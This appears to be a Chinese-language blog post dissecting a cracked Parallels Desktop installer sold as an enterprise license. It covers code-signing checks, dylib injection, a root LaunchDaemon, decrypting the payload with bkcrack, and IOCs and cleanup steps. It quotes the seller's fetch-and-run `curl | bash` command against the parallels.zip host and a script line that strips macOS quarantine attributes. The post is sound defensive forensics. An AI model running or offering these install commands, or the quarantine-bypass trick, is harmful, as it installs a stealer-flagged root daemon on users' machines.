---
title: 闲鱼 120 元买的「Parallels 企业版授权」，拆开发现是破解版
date: 2026-09-15 11:30:00
tags:
  - macOS
  - 逆向分析
  - 恶意软件
  - 取证
cover: /img/cover-2.jpg
categories:
  - 折腾记录
---

在闲鱼上花 120 元买了一份 Parallels Desktop「企业版授权」，卖家给了激活码，装完能用，还能小版本升级。直到杀毒软件报毒，才顺手查了一下——结果整条链拆下来，是个彻头彻尾的破解包。

这篇记录完整的取证过程和证据链。

<!-- more -->

## 起因

闲鱼上卖 Parallels 授权大致分两种：

- **明说是破解版**，价格极低，直接甩给你一个破解包下载链接
- **号称「企业版 / 集中授权」**，价格稍高，给你一个激活码，看起来像正经买卖

我买的是第二种，120 元。安装方式是卖家给的一行命令：

```bash
curl -fsSL https://download.parallels.zip/install.sh | bash
```

域名里有 `parallels`，看着像官方。装完输入激活码，激活成功，用了两个月，中间还成功升级过小版本。

直到小红伞（Avira）弹了报毒。

---

## 疑点一：签名对不上

先看那个被报毒的文件本身。

```console
$ codesign -dvvv Installer.app
Identifier=com.parallels.pdcert
CodeDirectory v=20400 flags=0x2(adhoc)
Signature=adhoc
TeamIdentifier=not set

$ spctl -a -vvv -t exec Installer.app
Installer.app: rejected
```

Bundle ID 写着 `com.parallels.pdcert`，Info.plist 里是 `© 2026 Parallels International GmbH`——但签名是 **adhoc**，`TeamIdentifier` 未设置。

任何在 macOS 上正常分发的商业软件，都必须用 Developer ID 签名并经过苹果公证，否则用户双击根本打不开。**adhoc 签名 = 这个程序被改过。**

顺手看了下已安装的 Parallels 本体，同样是 adhoc：

```console
$ codesign -dv /Applications/Parallels\ Desktop.app
Signature=adhoc
TeamIdentifier=not set
```

---

## 疑点二：那个安装脚本

把脚本拉下来看（只读不执行）：

```bash
ZIP_SRC_URLS=(
    "https://download.parallels.zip/Installer.zip"
    "https://cert.parallels.zip/Installer.zip"
    "https://cdn.parallels.zip/Installer.zip"
)
...
unzip -o "${APP_SRC_PATH}" -d "${TARGET_DIR}"
rm "${APP_SRC_PATH}"
xattr -cr "${APP_DST_PATH}"          # ← 关键
chflags nohidden "${APP_DST_PATH}"
open -R "${APP_DST_PATH}"
open -a "${APP_DST_PATH}"
```

![投放链路](/images/pd-crack-chain.svg)

`xattr -cr` 是整个脚本存在的理由。

macOS 会给所有从网上下载的文件打上 `com.apple.quarantine` 隔离标记，双击时 Gatekeeper 据此验证签名与公证。这个 app 是 adhoc 签名，带着标记必然被拦。剥掉标记，检查就不做了。

**正规软件永远不需要剥自己的隔离属性**——它签名公证齐全，Gatekeeper 本来就放行。写下这一行，等于承认「我过不了苹果的检查」。

脚本里还有几处设计值得一提：

| 手法 | 目的 |
|---|---|
| 三个镜像 + 测速 | 抗封禁 |
| 转圈动画 / 进度条 / 优雅报错 | 伪装成正规安装器 |
| 解压后 `rm` 掉原始 zip | 减少残留证据 |
| 失败时 `rm -fr` 整个目录 | 失败不留痕 |
| `open -a` 自动运行 | 不给检查窗口 |

写这个脚本的人很清楚：只要你信了域名、看着动画等几秒、app 自己弹出来，你就不会再去验签名了。

顺带验证了一下是否按 User-Agent 差异化投放（给研究员返回无害脚本、给真实用户返回载荷是常见手法）：

```console
curl UA    : a4b2f2bb07fdf6013456d6ea680233b7 (2978 B)
browser UA : a4b2f2bb07fdf6013456d6ea680233b7 (2978 B)
→ 内容一致，无差异化投放
```

这是本次唯一一条对它有利的证据：脚本对所有人都一样，不是定向攻击。

### 关于 `parallels.zip`

| | parallels.com | parallels.zip |
|---|---|---|
| 注册人 | **Parallels International GmbH** | 无组织信息 |
| 注册商 | MarkMonitor（企业品牌保护） | — |
| DNS | AWS Route53 | Cloudflare |
| 证书 | — | Google Trust Services 免费 DV |

DV 证书只证明「有人控制这个域名」，不含任何组织身份。另外 `.zip` 是 2023 年才开放的 TLD，正因为容易和文件名混淆，一直是钓鱼高发区——服务端还把 shell 脚本的 `content-disposition` 设成了 `filename="Installer.zip"`。

---

## 疑点三：资源文件里藏了东西

app 的 Resources 目录有三个可疑文件：

```console
$ file Resources/license.*
license.cert: RIFF (little-endian) data
license.db:   openssl enc'd data with salted password
license.dv:   ASCII text, with very long lines (65536)

$ head -c 32 Resources/license.cert | xxd
00000000: 5249 4646 4d5a 504b 0304 1400 0900 0800  RIFF MZ PK......
00000020: 1000 1c00 6c69 6263 6861 6e6e 656c 2e64  ....libchannel.d
```

`RIFF` 只是前 4 个字节的伪造头。跳过 6 字节，后面是标准的 **ZIP 本地文件头**（`PK\x03\x04`），第一个条目叫 `libchannel.dylib`。

![载荷嵌套结构](/images/pd-crack-payload.svg)

解出来 38 个条目，但**全部加密**。

---

## 破开加密

检查加密算法：

```console
flag_bits = 0x9
  bit0 加密       : True
  bit6 强加密/AES : False
  compress_type   : 8 (deflate)
→ ZipCrypto
```

用的是老式 ZipCrypto，**对已知明文攻击不设防**。而我手上恰好有完美的已知明文——载荷里的 `pubkey` 已经被安装到系统里了，就是 `/Library/Application Support/Parallels/.pubkey`。

唯一的麻烦是条目用 deflate 压缩，攻击需要压缩后的字节流。试着复现：

```console
zip 中 pubkey: 原始=10955  压缩后=6416 (含12字节加密头)
→ 纯 deflate 流应为 6404 字节

  level 5: 6404 字节  ← 命中
```

zlib level 5 精确复现。剩下的交给 [bkcrack](https://github.com/kimci86/bkcrack)：

```console
[10:50:33] Z reduction using 6397 bytes of known plaintext
[10:50:34] Keys
e0504b59 713c572f 8e942412
```

一秒出密钥，38 个条目全部解开。

---

## `certs/` 里不是证书

这是整件事最关键的发现。

载荷里有个 `certs/` 目录，32 个文件，每个 868–1456 字节，文件名是 16 位十六进制。看着像证书，解开却是：

```console
$ head -c 48 certs/11a992dc882b08de | xxd
00000000: 5041 4745 5a45 524f 4301 0000 0000 0000  PAGEZERO C......
00000020: 425a 6839 3141 5926 5359 fbe0 608d 0001  BZh91AY&SY..`...
```

`PAGEZERO` 是 Mach-O 的段名，后面跟着 bzip2 流。解压每个流：

```
流 ① →     1,128 字节   补丁偏移表
流 ② → 32,148,835 字节   稀疏数据 = 重新计算好的代码签名页哈希表
流 ③ →       669 字节   目标标识: channel.cert_p-55554944...
```

（`55554944` 就是 ASCII 的 `UUID`。）

扫描全部 32 个文件：

```
文件名              段名        目标                        解压总量
11a992dc882b08de   PAGEZERO   channel.cert_p-5555…       32,150,632
1b64b8c4e313fd17   PAGEZERO   upportchannel.cert_p-…     81,515,336
2426ed818d7b6e77   PAGEZERO   channel.cert_1014_p-…      17,857,160
...
涉及目标: channel.cert / upportchannel.cert / channel.cert_1014
```

**这 32 个文件，是为 32 个不同 Parallels 版本预先算好的「二进制补丁 + 代码签名页哈希表」。**

这直接解释了我之前最大的困惑：为什么能小版本升级？不是因为授权合法，而是**作者把 32 个版本的补丁全部提前做好了**。

---

## 破解原理

到这里机制已经完全清楚。

![正版激活与破解激活对比](/images/pd-crack-vs-genuine.svg)

核心就一句话：把「向 Parallels 服务器证明你有授权」替换成「向破解自己提供的信任锚证明」。

具体分四层：

![破解四层机制](/images/pd-crack-layers.svg)

### 第一层：dylib 注入

Mach-O 头部有一串 `LC_LOAD_DYLIB`，列出程序依赖哪些动态库，dyld 启动时会全部加载。破解在末尾追加了一条：

```console
$ otool -l prl_client_app | grep -c 'cmd LC_LOAD_DYLIB'
106

   105   /usr/lib/libobjc.A.dylib
   106   /Library/Application Support/Parallels/channel.cert   ← 最后一条
```

追加在所有原始依赖之后，是 dylib 注入的典型特征。而 `channel.cert` 其实是个 dylib，改名只为在目录里看起来像证书：

```console
$ file channel.cert
Mach-O universal binary: [x86_64:dynamically linked shared library] [arm64]
$ otool -L channel.cert | head -2
	/usr/local/lib/libchannel.dylib (current version 27.0.1)
	/System/Library/Frameworks/CFNetwork.framework/...
```

它的加载时入口：

```console
sectname __mod_init_func    size 0xd0    ← 208 字节 = 26 个构造函数指针
```

`__mod_init_func` 里的函数在 dylib 被加载时自动执行，**早于 `main()`**——程序自己的代码还没开始跑，钩子已经装好了。

### 第二层：函数挂钩

Parallels 用 Qt 编写，授权校验走 Qt 网络栈。这个 dylib 正好链接了 `QtNetwork`、`QtCore`、`Security`、`CFNetwork`。构造函数在 `main()` 前改写导入表，把校验相关调用重定向到自己的实现。

具体 hook 了哪些函数看不到——它上了商业级保护壳：

```console
$ nm -u channel_arm64.dylib | wc -l
5748                              # 5748 个导入符号
$ nm -u channel_arm64.dylib | head -1
0��LMk=���T��Nx/���ȩ...          # 名字全是密文

$ otool -l channel_arm64.dylib | awk '/sectname/{print}'
  sectname                        # 节名被抹空
  sectname
  sectname __gcc_except_tab
```

### 第三层：伪造信任锚

授权数据是签名的，程序会验签。破解装了一条 4 级证书链作为 `.pubkey`：

```
desktop.parallels.com
  ← Parallels Desktop CA
    ← Paralels Issuing CA #1
      ← Parallels External root CA
```

配合加密的 `licenses.db`，伪造的授权用这条链验签自然通过。

### 第四层：重签名（死穴所在）

**只要改动 Mach-O 哪怕一个字节，原签名即失效，macOS 拒绝加载。** 所以必须重签。但破解没有 Parallels 的私钥，只能用 adhoc 签名。

这条约束是物理性的、绕不过去的，它直接产生了全部可观测证据：

- `Signature=adhoc`、`TeamIdentifier=not set`
- `spctl` 判定 `rejected`
- 安装脚本必须 `xattr -cr`

**反过来说：「adhoc 签名」本身就是「这个程序被改过」的铁证**，不需要任何额外推理。

而重算签名很贵——`prl_client_app` 有 60 MB，要逐页做 SHA256。所以作者提前算好，打包成 `certs/` 里那 32 个文件，安装时按版本查表直接套用。

### 持久化

Parallels 升级会用原厂文件覆盖被打过补丁的文件，破解就失效了。所以还需要一个常驻进程：

```console
$ plutil -p /Library/LaunchDaemons/com.parallels.certificate.plist
{
  "Label"            => "com.parallels.certificate"
  "ProgramArguments" => ["/Library/Application Support/Parallels/Parallels Certificate"]
  "UserName"         => "root"
  "RunAtLoad"        => true
  "KeepAlive"        => { "Crashed" => true, "SuccessfulExit" => false }
}
```

root 权限、开机自启、崩溃重拉。`.data/{.c,.d,.v}` 里备份的 107 MB 原始二进制，就是它做差分补丁的基准。

### 为什么这套能成功

三个前提缺一不可：

1. `/Applications` 和 `/Library/Application Support` **不受 SIP 保护**（SIP 只锁 `/System`、`/usr` 等）
2. 安装时用户**授予了管理员权限**
3. Parallels **没有有效的运行时自检**——或者说自检代码和注入的 dylib 在同一个进程里，已经被绕过

---

## 杀软怎么说

Avira 的检测记录库（`activitylog.db`，全局可读）里翻到了判定名：

```console
$ sqlite3 activitylog.db "SELECT datetime(timestamp,'unixepoch','localtime'), arg1, arg2
                          FROM log WHERE arg2 LIKE '%OSX%' ORDER BY timestamp;"

2026-08-18 13:39:15 | LicenseInstaller      | TR/OSX.Stealer.IW
2026-08-18 13:41:02 | Parallels Certificate | TR/OSX.Stealer.IW
2026-09-13 16:05:36 | LicenseInstaller      | TR/OSX.Stealer.IW
2026-09-13 16:06:48 | Parallels Certificate | TR/OSX.Stealer.IW
```

`TR/` = 木马，`Stealer` = 信息窃取。**不是 PUA / Riskware / Crack 那一类。**

两点必须说明：

- 单一厂商的检测名是信号不是铁证。不过 `.IW` 是具体变种签名，不是 `TR/Malware` 那种兜底桶。
- 我的静态分析没能看到窃密行为：无明文 URL、无外联连接、无监听端口。但该二进制字符串表与符号表全部加密，**我无法排除运行时解密后的行为**。

有个细节值得注意：Avira 会在文件落盘瞬间删掉安装器（连 `shasum` 都读不到，报 `Operation not permitted`），但**已经落地的 root 守护进程和注入的 dylib 一直原封不动躺在盘上**。

也就是说，你看到的报毒是针对 Downloads 里的安装器残留，不是针对正在生效的载荷。只删 Downloads 那个文件夹，报警会消失，但 root daemon 和 dylib 还在。

万幸的一点：这台机器自 9/13 安装后一直没重启，`RunAtLoad` 从未触发。

```console
$ ls /var/log/certificate.log
No such file or directory              # StandardOutPath 从未被创建

$ log show --predicate 'process == "launchd" AND eventMessage CONTAINS "parallels.certificate"'
(空)                                    # launchd 从未加载过它
```

那个被判为 Stealer 的 root 组件**一次都没执行过**——但一重启就会首次以 root 运行。所以清理必须赶在重启前。

---

## 那个激活码到底是真是假

```console
$ prlsrvctl info | grep License
License: state='valid' key='4BYWP3-XXXXXX-XXXXXX-XXXXXX-XXXXXX' restricted='false'
```

key 是 30 位、5 组 × 6 位，**符合 Parallels 官方规范**，说明卖家给的不是随手编的字符串。

但 `state='valid'` **完全不能采信**——报出这句话的 `prlsrvctl` 属于那个被打了补丁的 app，而注入的 dylib 劫持的正是授权校验路径。等于让嫌疑人自证清白。

**从这台机器上，永远问不出这个 key 是真是假。** 唯一的判定方法是：卸干净，装官方版，输入这个 key。

- 激活成功 → key 是真的（但来源仍可能有问题，后续可能被吊销）
- 提示无效 → key 只是个道具，让交易看起来像正经买卖

不过这个问题其实已经不重要了。整套机制里**没有任何一环与 Parallels 服务器发生真实交互**——哪怕你的 key 百分之百是正版，你装的这个程序也已经被第三方改过了。**授权的合法性和二进制的完整性，是两件独立的事。**

---

## 怎么自查

如果你也在第三方渠道买过 Parallels 授权，三条命令就能判断：

```bash
codesign -dv /Applications/Parallels\ Desktop.app 2>&1 | grep -E 'Signature|TeamIdentifier'
```

正常应该显示 `Authority=Developer ID Application: Parallels International GmbH` 和一个 Team ID。如果是 `Signature=adhoc` / `TeamIdentifier=not set`，已经被改了。

```bash
ls -la /Library/LaunchDaemons/ | grep -i parallels
```

正版不会有 `com.parallels.certificate.plist` 这种东西。

```bash
otool -L /Applications/Parallels\ Desktop.app/Contents/MacOS/prl_client_app | grep -i 'Application Support'
```

主程序不应该依赖 `/Library/Application Support/` 下的任何动态库。

### 清理

```bash
sudo launchctl bootout system/com.parallels.certificate 2>/dev/null
sudo rm -f /Library/LaunchDaemons/com.parallels.certificate.plist
sudo rm -rf "/Library/Application Support/Parallels"
sudo rm -rf "/Applications/Parallels Desktop.app"
```

虚拟机文件在 `~/Parallels/`，不受影响，重装官方版后可直接使用。

---

## IOC

**域名**

```
download.parallels.zip
cert.parallels.zip
cdn.parallels.zip
```

**文件哈希（SHA256）**

```
20bcb7fbab3cf3a268585df02e14ddbd2e76a3d795a51c6395e88b60b8185c38  LicenseInstaller
584b7a8a67d8bce45794e9fc15d4551639eae0ca754285a2942149b8b63362d7  Parallels Certificate
30288fe7a35511e6601871bf0196d9294a6cdd83fdf312fcca8fc1c9800ed029  channel.cert
a4b2f2bb07fdf6013456d6ea680233b7cbc798013a142cd5cc6f220735991e62  install.sh
```

**落地路径**

```
/Library/LaunchDaemons/com.parallels.certificate.plist
/Library/Application Support/Parallels/Parallels Certificate
/Library/Application Support/Parallels/channel.cert
/Library/Application Support/Parallels/.pubkey
/Library/Application Support/Parallels/.data/{.c,.d,.v}
~/Downloads/LicenseInstaller/
```

**检测名**

```
Avira: TR/OSX.Stealer.IW
```

---

## 结论

买到的不是「企业版授权」，是一个破解包加一个格式正确的激活码。激活码大概率只是让交易看起来像正经买卖的道具——真正让软件能用的，是那个 root 守护进程和注入进程的 dylib。

几点教训：

**第一，`curl | bash` 之前先把脚本下下来看一眼。** 就多一步的事，这次的脚本里那行 `xattr -cr` 单独拎出来就足够定性。

**第二，域名里包含品牌名 ≠ 官方域名。** `.zip`、`.app` 这类新 TLD 尤其要警惕，它们天然容易和文件名混淆。真官方域名一般用 MarkMonitor 这类企业品牌保护注册商，whois 里能查到公司名。

**第三，macOS 上判断一个 app 是否被动过，`codesign` + `spctl` 两条命令就够了。** 二进制补丁必然破坏签名，这是绕不过去的物理约束——无论破解做得多精致，adhoc 签名这个尾巴藏不住。

**第四，杀软报毒后别只删报出来的那个文件。** 这次 Avira 秒删安装器，却对已经落地的 root 守护进程无动于衷。真正危险的组件往往不是被报出来的那个。

至于 120 块——就当买了个样本，写了篇文章。

---

*本文为个人设备上的安全取证记录。文中的分析方法（静态分析、已知明文攻击）均为公开的标准手段，用于理解自己机器上运行的是什么。相关样本未作传播。*
